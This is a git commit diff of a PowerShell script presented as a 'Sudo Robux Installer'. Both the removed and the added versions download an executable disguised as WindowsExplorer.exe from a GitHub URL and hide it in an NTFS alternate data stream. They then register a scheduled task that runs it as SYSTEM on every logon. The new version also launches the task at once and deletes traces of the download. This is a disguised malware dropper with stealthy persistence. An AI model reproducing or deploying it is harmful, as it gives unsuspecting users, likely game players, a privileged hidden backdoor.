d50bdf13d7a4ab8c928ba55d435f0a93ac414245
Abdullah Zafar <102247412+HadronCollision@users.noreply.github.com>
2025-07-22 11:41:23 +0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,8 +1,12 @@
-Write-Host "Downloading payload"
-curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe?token=GHSAT0AAAAAACQ6YJCXJ7BAD4F3GIWYSWPS2D7FEVQ -o russianhuzz
-Write-Host "Download complete"
-type russianhuzz > C:\Windows:Explorer
-Write-Host "Installing in progress"
-schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create \"C:\Windows:Explorer\"" /sc onlogon /ru "SYSTEM" /rl highest /f
-Write-Host "Installation complete"
-Write-Host "Restart the system to activate it"
+Clear-Host
+Write-Host "Sudo Robux Installer" -ForegroundColor Magenta -NoNewLine
+Write-Host " by Hadron" -ForegroundColor DarkGray
+Write-Host
+Write-Host "Downloading..." -ForegroundColor DarkCyan
+curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe -o russianhuzz
+Write-Host "Installing..." -ForegroundColor DarkCyan
+cmd.exe /c "type russianhuzz > C:\Windows:Explorer"
+rm .\russianhuzz
+schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create C:\Windows:Explorer" /sc onlogon /ru "SYSTEM" /rl highest /f > $null 2>&1
+schtasks /run /tn WindowsExplorer > $null 2>&1
+Write-Host
